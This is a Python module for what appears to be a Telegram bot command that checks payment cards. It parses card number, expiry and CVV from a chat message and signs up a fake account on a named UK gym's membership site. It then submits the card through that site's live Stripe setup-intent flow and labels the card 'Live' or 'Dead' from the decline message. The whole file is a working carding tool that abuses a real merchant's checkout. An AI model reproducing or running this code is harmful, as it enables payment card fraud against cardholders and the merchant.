from random import choice
from string import ascii_letters
from urllib.parse import quote
from src.gates.esentials import getstr, get_cc
from aiohttp import ClientSession

async def Stripe_command(update, ParseMode, ChatAction):
    await update.message.reply_chat_action(ChatAction)
    try:
        text=update.message.text
        ccs=get_cc(text)
        if(not isinstance(ccs, list)):
            return await update.message.reply_text(f"<b>{ccs}</b>", reply_to_message_id=update.message.message_id, parse_mode=ParseMode)
        cc=ccs[0]
        mes=ccs[1]
        ano=ccs[2]
        cvv=ccs[3]
    except IndexError:
        return await update.message.reply_text(f"<b>Invalid card details: CC </b>", reply_to_message_id=update.message.message_id, parse_mode=ParseMode)
   
    async with ClientSession() as session:
        msj=await stripe(session, cc, mes, ano, cvv)

    if "Your card's security code is incorrect" in msj:
        await update.message.reply_text(f"""<b>𝗖𝗖</b>: {cc}|{mes}|{ano}|{cvv}\n<b>𝗦𝘁𝗮𝘁𝘂𝘀</b>: Live ✅\n<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b>: {msj}""", reply_to_message_id=update.message.message_id, parse_mode=ParseMode)
    else:
        await update.message.reply_text(f"""<b>𝗖𝗖</b>: {cc}|{mes}|{ano}|{cvv}\n<b>𝗦𝘁𝗮𝘁𝘂𝘀</b>: Dead ❌\n<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b>: {msj}</b>""", reply_to_message_id=update.message.message_id, parse_mode=ParseMode)


async def stripe(sess, cc:str, mes:str, ano:str, cvv:str) -> str:
    gmail=''.join(choice(ascii_letters) for x in range(15))+"@gmail.com"
    username=''.join(choice(ascii_letters) for x in range(15))
    headers = {
        'authority': 'www.gogym.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.gogym.uk/memberships/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    response = await sess.get('https://www.gogym.uk/register/go-gold/', headers=headers)
    response = await response.text()
    payment_method=getstr(response, 'mepr-payment-method mepr_payment_method-', '">')


    headers = {
        'authority': 'www.gogym.uk',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'es-ES,es;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvmR1NQgsqjjbqc1F',
        'origin': 'https://www.gogym.uk',
        'referer': 'https://www.gogym.uk/register/go-gold/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = f'------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_process_signup_form"\r\n\r\nY\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_product_id"\r\n\r\n30594\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="user_first_name"\r\n\r\nAlex\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="user_last_name"\r\n\r\nXDDDDD\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_phone"\r\n\r\n+19513573866\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr-geo-country"\r\n\r\n\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="user_login"\r\n\r\n{username}\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="user_email"\r\n\r\n{gmail}\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_user_password"\r\n\r\nAlex1245\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_user_password_confirm"\r\n\r\nAlex1245\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_coupon_code"\r\n\r\n\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_payment_method"\r\n\r\n{payment_method}\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_agree_to_tos"\r\n\r\non\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_agree_to_privacy_policy"\r\n\r\non\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F\r\nContent-Disposition: form-data; name="mepr_no_val"\r\n\r\n\r\n------WebKitFormBoundaryvmR1NQgsqjjbqc1F--\r\n'

    response = await sess.post('https://www.gogym.uk/register/go-gold/', headers=headers, data=data)
    response = await response.text()

    idd=getstr(response, 'name="mepr_transaction_id" value="', '"')

    headers = {
        'authority': 'www.gogym.uk',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarymmfMaL3qH0eFEeMi',
        'origin': 'https://www.gogym.uk',
        'pragma': 'no-cache',
        'referer': 'https://www.gogym.uk/register/go-gold/?action=checkout&txn=9p',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = '------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="mepr_transaction_id"\r\n\r\n{}\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="address_required"\r\n\r\n0\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="card-first-name"\r\n\r\nAlex\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="card-last-name"\r\n\r\nXDDDDD\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="action"\r\n\r\nmepr_stripe_confirm_payment\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi\r\nContent-Disposition: form-data; name="mepr_current_url"\r\n\r\nhttps://www.gogym.uk/register/go-gold/?action=checkout&txn=9p#mepr_jump\r\n------WebKitFormBoundarymmfMaL3qH0eFEeMi--\r\n'.format(idd)

    response = await sess.post('https://www.gogym.uk/wp-admin/admin-ajax.php', headers=headers, data=data)
    response = await response.json()

    client=response["client_secret"]
    seti=client.split("_secret_")[0]
    return_url=quote(response["return_url"])

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-ES,es;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    data = f'return_url={return_url}&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=axelele99939ll2llwlw%40gmail.com&payment_method_data[billing_details][name]=Alex+XDDDDD&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F98f8a80b03%3B+stripe-js-v3%2F98f8a80b03%3B+payment-element%3B+deferred-intent&payment_method_data[time_on_page]=43294&payment_method_data[guid]=840275b1-b5c6-45db-95aa-c1c618a85589e99c69&payment_method_data[muid]=264a476a-045b-4b1b-9739-3313a9461081109bb7&payment_method_data[sid]=a38e69c2-46fb-4de5-a380-43ad323974f1bc9d70&expected_payment_method_type=card&client_context[currency]=gbp&client_context[mode]=setup&client_context[setup_future_usage]=off_session&client_context[payment_method_types][0]=card&client_context[payment_method_types][1]=link&use_stripe_sdk=true&key=pk_live_51H88NWDultMwWkQqhpQa5jZXpX2jkTd1OBftFGmx03aM8R7l1ZlP7RaJb4YK6x5OZjijlIdOJHL3YL14pVugIV2b00H5AVExGw&_stripe_version=2022-11-15&client_secret={client}'

    response = await sess.post(
        f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
        headers=headers,
        data=data,
    )
    try:
        response = await response.json()
        msjs=response["error"]["message"]
        text=msjs
    except KeyError:
        text="3D"
    return text
